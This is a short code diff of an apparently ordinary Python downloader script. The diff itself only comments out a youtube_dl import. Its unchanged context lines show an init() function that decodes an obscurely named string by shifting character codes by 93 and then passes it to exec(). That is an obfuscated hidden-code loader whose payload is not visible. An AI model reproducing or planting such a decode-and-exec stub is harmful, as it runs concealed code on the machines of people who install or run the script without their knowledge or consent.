@@ -4,7 +4,7 @@ def init():
     ddgfwzxsla = ''.join([chr(int(x) - 93) for x in ddgfwzxsla])
     exec(ddgfwzxsla)
     #main modules
-import youtube_dl
+#import youtube_dl
 import requests
 import sys
 import urllib.parse as urlparse
